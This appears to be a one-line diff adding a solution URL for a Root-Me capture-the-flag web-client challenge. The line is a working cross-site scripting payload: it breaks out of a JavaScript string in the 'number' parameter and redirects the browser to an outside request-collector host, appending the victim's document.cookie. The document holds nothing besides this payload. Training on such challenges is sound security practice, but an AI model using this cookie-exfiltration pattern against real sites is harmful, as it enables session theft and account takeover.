@@ -1,0 +1,1 @@
+http://challenge01.root-me.org/web-client/ch32/index.php?number=';document.location.href='https://1cbc05c9d3b9533c136bdb7d71fce3a0.m.pipedream.net?flag='.concat(document.cookie);//
